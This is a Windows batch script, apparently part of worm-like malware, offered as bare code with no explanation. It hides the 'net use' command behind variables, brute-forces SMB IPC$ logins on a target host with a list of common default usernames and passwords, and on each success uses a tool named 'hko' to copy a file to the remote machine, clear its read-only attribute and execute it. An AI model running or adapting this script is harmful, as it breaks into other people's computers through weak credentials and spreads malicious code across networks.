@echo off
set D=u
set E=s
set F=e
net %D%%E%%F% \\%1\IPC$ "xxyyzz" /user:administrator
if NOT errorlevEl 1 goto zX29
net %D%%E%%F% \\%1\IPC$ "abc" /user:administrator
if NOT errorlevEl 1 goto zX30
net %D%%E%%F% \\%1\IPC$ "student" /user:student
if NOT errorlevEl 1 goto zX31
net %D%%E%%F% \\%1\IPC$ "teacher" /user:teacher
if NOT errorlevEl 1 goto zX32
net %D%%E%%F% \\%1\IPC$ "" /user:user
if NOT errorlevEl 1 goto zX33
net %D%%E%%F% \\%1\IPC$ "user" /user:user
if NOT errorlevEl 1 goto zX34
net %D%%E%%F% \\%1\IPC$ "test" /user:test
if NOT errorlevEl 1 goto zX4
net %D%%E%%F% \\%1\IPC$ "test123" /user:administrator
if NOT errorlevEl 1 goto zX5
net %D%%E%%F% \\%1\IPC$ "1" /user:administrator
if NOT errorlevEl 1 goto zX26
net %D%%E%%F% \\%1\IPC$ "123" /user:administrator
if NOT errorlevEl 1 goto zX27
net %D%%E%%F% \\%1\IPC$ "12345" /user:admin
if NOT errorlevEl 1 goto zX28
net %D%%E%%F% \\%1\IPC$ "temp" /user:administrator
if NOT errorlevEl 1 goto zX6
net %D%%E%%F% \\%1\IPC$ "" /user:administrator
if NOT errorlevEl 1 goto zX1
net %D%%E%%F% \\%1\IPC$ "" /user:administrator
if NOT errorlevEl 1 goto zX35
net %D%%E%%F% \\%1\IPC$ "Administrator" /user:administrator
if NOT errorlevEl 1 goto zX2
net %D%%E%%F% \\%1\IPC$ "Administrator" /user:administrator
if NOT errorlevEl 1 goto zX37
net %D%%E%%F% \\%1\IPC$ "test" /user:administrator
if NOT errorlevEl 1 goto zX3
net %D%%E%%F% \\%1\IPC$ "admin" /user:administrator
if NOT errorlevEl 1 goto zX10
net %D%%E%%F% \\%1\IPC$ "temp123" /user:administrator
if NOT errorlevEl 1 goto zX7
net %D%%E%%F% \\%1\IPC$ "pass" /user:administrator
if NOT errorlevEl 1 goto zX8
net %D%%E%%F% \\%1\IPC$ "password" /user:administrator
if NOT errorlevEl 1 goto zX9
net %D%%E%%F% \\%1\IPC$ "root" /user:root
if NOT errorlevEl 1 goto zX11
net %D%%E%%F% \\%1\IPC$ "changeme" /user:administrator
if NOT errorlevEl 1 goto zX12
net %D%%E%%F% \\%1\IPC$ "admin" /user:admin
if NOT errorlevEl 1 goto zX13
net %D%%E%%F% \\%1\IPC$ "123456" /user:administrator
if NOT errorlevEl 1 goto zX14
net %D%%E%%F% \\%1\IPC$ "654321" /user:administrator
if NOT errorlevEl 1 goto zX15
net %D%%E%%F% \\%1\IPC$ "abc123" /user:administrator
if NOT errorlevEl 1 goto zX16
net %D%%E%%F% \\%1\IPC$ "12345" /user:administrator
if NOT errorlevEl 1 goto zX36
net %D%%E%%F% \\%1\IPC$ "red123" /user:administrator
if NOT errorlevEl 1 goto zX17
net %D%%E%%F% \\%1\IPC$ "admin123" /user:administrator
if NOT errorlevEl 1 goto zX18
net %D%%E%%F% \\%1\IPC$ "qwerty" /user:administrator
if NOT errorlevEl 1 goto zX19
net %D%%E%%F% \\%1\IPC$ "asdf" /user:administrator
if NOT errorlevEl 1 goto zX20
net %D%%E%%F% \\%1\IPC$ "password123" /user:administrator
if NOT errorlevEl 1 goto zX21
net %D%%E%%F% \\%1\IPC$ "secret" /user:administrator
if NOT errorlevEl 1 goto zX22
net %D%%E%%F% \\%1\IPC$ "qwertyuiop" /user:administrator
if NOT errorlevEl 1 goto zX23
net %D%%E%%F% \\%1\IPC$ "12345" /user:administrator
if NOT errorlevEl 1 goto zX24
net %D%%E%%F% \\%1\IPC$ "54321" /user:administrator
if NOT errorlevEl 1 goto zX25
goto zXend
:zX1
hko \\%1 -u administrator -p "" -d attrib.exe -r %2
hko \\%1 -u administrator -p "" -f -c -d %2 -o
hko \\%1 -u administrator -p "" -d %2 -o
goto zXend
:zX10
hko \\%1 -u administrator -p "admin" -d attrib.exe -r %2
hko \\%1 -u administrator -p "admin" -f -c -d %2 -o
hko \\%1 -u administrator -p "admin" -d %2 -o
goto zXend
:zX2
hko \\%1 -u administrator -p "administrator" -d attrib.exe -r %2
hko \\%1 -u administrator -p "administrator" -f -c -d %2 -o
hko \\%1 -u administrator -p "administrator" -d %2 -o
goto zXend
:zX37
hko \\%1 -u administrator -p "Administrator" -d attrib.exe -r %2
hko \\%1 -u administrator -p "Administrator" -f -c -d %2 -o
hko \\%1 -u administrator -p "Administrator" -d %2 -o
goto zXend
:zX11
hko \\%1 -u root -p "root" -d attrib.exe -r %2
hko \\%1 -u root -p "root" -f -c -d %2 -o
hko \\%1 -u root -p "root" -d %2 -o
goto zXend
:zX13
hko \\%1 -u admin -p "admin" -d attrib.exe -r %2
hko \\%1 -u admin -p "admin" -f -c -d %2 -o
hko \\%1 -u admin -p "admin" -d %2 -o
goto zXend
:zX3
hko \\%1 -u administrator -p "test" -d attrib.exe -r %2
hko \\%1 -u administrator -p "test" -f -c -d %2 -o
hko \\%1 -u administrator -p "test" -d %2 -o
goto zXend
:zX4
hko \\%1 -u test -p "test" -d attrib.exe -r %2
hko \\%1 -u test -p "test" -f -c -d %2 -o
hko \\%1 -u test -p "test" -d %2 -o
goto zXend
:zX5
hko \\%1 -u administrator -p "test123" -d attrib.exe -r %2
hko \\%1 -u administrator -p "test123" -f -c -d %2 -o
hko \\%1 -u administrator -p "test123" -d %2 -o
goto zXend
:zX6
hko \\%1 -u administrator -p "temp" -d attrib.exe -r %2
hko \\%1 -u administrator -p "temp" -f -c -d %2 -o
hko \\%1 -u administrator -p "temp" -d %2 -o
goto zXend
:zX7
hko \\%1 -u administrator -p "temp123" -d attrib.exe -r %2
hko \\%1 -u administrator -p "temp123" -f -c -d %2 -o
hko \\%1 -u administrator -p "temp123" -d %2 -o
goto zXend
:zX8
hko \\%1 -u administrator -p "pass" -d attrib.exe -r %2
hko \\%1 -u administrator -p "pass" -f -c -d %2 -o
hko \\%1 -u administrator -p "pass" -d %2 -o
goto zXend
:zX9
hko \\%1 -u administrator -p "password" -d attrib.exe -r %2
hko \\%1 -u administrator -p "password" -f -c -d %2 -o
hko \\%1 -u administrator -p "password" -d %2 -o
goto zXend
:zX12
hko \\%1 -u administrator -p "changeme" -d attrib.exe -r %2
hko \\%1 -u administrator -p "changeme" -f -c -d %2 -o
hko \\%1 -u administrator -p "changeme" -d %2 -o
goto zXend
:zX14
hko \\%1 -u administrator -p "123456" -d attrib.exe -r %2
hko \\%1 -u administrator -p "123456" -f -c -d %2 -o
hko \\%1 -u administrator -p "123456" -d %2 -o
goto zXend
:zX15
hko \\%1 -u administrator -p "654321" -d attrib.exe -r %2
hko \\%1 -u administrator -p "654321" -f -c -d %2 -o
hko \\%1 -u administrator -p "654321" -d %2 -o
goto zXend
:zX16
hko \\%1 -u administrator -p "abc123" -d attrib.exe -r %2
hko \\%1 -u administrator -p "abc123" -f -c -d %2 -o
hko \\%1 -u administrator -p "abc123" -d %2 -o
goto zXend
:zX17
hko \\%1 -u administrator -p "red123" -d attrib.exe -r %2
hko \\%1 -u administrator -p "red123" -f -c -d %2 -o
hko \\%1 -u administrator -p "red123" -d %2 -o
goto zXend
:zX18
hko \\%1 -u administrator -p "admin123" -d attrib.exe -r %2
hko \\%1 -u administrator -p "admin123" -f -c -d %2 -o
hko \\%1 -u administrator -p "admin123" -d %2 -o
goto zXend
:zX19
hko \\%1 -u administrator -p "qwerty" -d attrib.exe -r %2
hko \\%1 -u administrator -p "qwerty" -f -c -d %2 -o
hko \\%1 -u administrator -p "qwerty" -d %2 -o
goto zXend
:zX20
hko \\%1 -u administrator -p "asdf" -d attrib.exe -r %2
hko \\%1 -u administrator -p "asdf" -f -c -d %2 -o
hko \\%1 -u administrator -p "asdf" -d %2 -o
goto zXend
:zX21
hko \\%1 -u administrator -p "password123" -d attrib.exe -r %2
hko \\%1 -u administrator -p "password123" -f -c -d %2 -o
hko \\%1 -u administrator -p "password123" -d %2 -o
goto zXend
:zX22
hko \\%1 -u administrator -p "secret" -d attrib.exe -r %2
hko \\%1 -u administrator -p "secret" -f -c -d %2 -o
hko \\%1 -u administrator -p "secret" -d %2 -o
goto zXend
:zX23
hko \\%1 -u administrator -p "qwertyuiop" -d attrib.exe -r %2
hko \\%1 -u administrator -p "qwertyuiop" -f -c -d %2 -o
hko \\%1 -u administrator -p "qwertyuiop" -d %2 -o
goto zXend
:zX24
hko \\%1 -u administrator -p "12345" -d attrib.exe -r %2
hko \\%1 -u administrator -p "12345" -f -c -d %2 -o
hko \\%1 -u administrator -p "12345" -d %2 -o
goto zXend
:zX25
hko \\%1 -u administrator -p "54321" -d attrib.exe -r %2
hko \\%1 -u administrator -p "54321" -f -c -d %2 -o
hko \\%1 -u administrator -p "54321" -d %2 -o
goto zXend
:zX26
hko \\%1 -u administrator -p "1" -d attrib.exe -r %2
hko \\%1 -u administrator -p "1" -f -c -d %2 -o
hko \\%1 -u administrator -p "1" -d %2 -o
goto zXend
:zX27
hko \\%1 -u administrator -p "123" -d attrib.exe -r %2
hko \\%1 -u administrator -p "123" -f -c -d %2 -o
hko \\%1 -u administrator -p "123" -d %2 -o
goto zXend
:zX28
hko \\%1 -u admin -p "12345" -d attrib.exe -r %2
hko \\%1 -u admin -p "12345" -f -c -d %2 -o
hko \\%1 -u admin -p "12345" -d %2 -o
goto zXend
:zX29
hko \\%1 -u administrator -p "xxyyzz" -d attrib.exe -r %2
hko \\%1 -u administrator -p "xxyyzz" -f -c -d %2 -o
hko \\%1 -u administrator -p "xxyyzz" -d %2 -o
goto zXend
:zX30
hko \\%1 -u administrator -p "abc" -d attrib.exe -r %2
hko \\%1 -u administrator -p "abc" -f -c -d %2 -o
hko \\%1 -u administrator -p "abc" -d %2 -o
goto zXend
:zX31
hko \\%1 -u student -p "student" -d attrib.exe -r %2
hko \\%1 -u student -p "student" -f -c -d %2 -o
hko \\%1 -u student -p "student" -d %2 -o
goto zXend
:zX32
hko \\%1 -u teacher -p "teacher" -d attrib.exe -r %2
hko \\%1 -u teacher -p "teacher" -f -c -d %2 -o
hko \\%1 -u teacher -p "teacher" -d %2 -o
goto zXend
:zX33
hko \\%1 -u user -p "" -d attrib.exe -r %2
hko \\%1 -u user -p "" -f -c -d %2 -o
hko \\%1 -u user -p "" -d %2 -o
goto zXend
:zX34
hko \\%1 -u user -p "user" -d attrib.exe -r %2
hko \\%1 -u user -p "user" -f -c -d %2 -o
hko \\%1 -u user -p "user" -d %2 -o
goto zXend
:zX35
hko \\%1 -u administrator -p "" -d attrib.exe -r %2
hko \\%1 -u administrator -p "" -f -c -d %2 -o
hko \\%1 -u administrator -p "" -d %2 -o
goto zXend
:zX36
hko \\%1 -u administrator -p "12345" -d attrib.exe -r %2
hko \\%1 -u administrator -p "12345" -f -c -d %2 -o
hko \\%1 -u administrator -p "12345" -d %2 -o
goto zXend
:zXend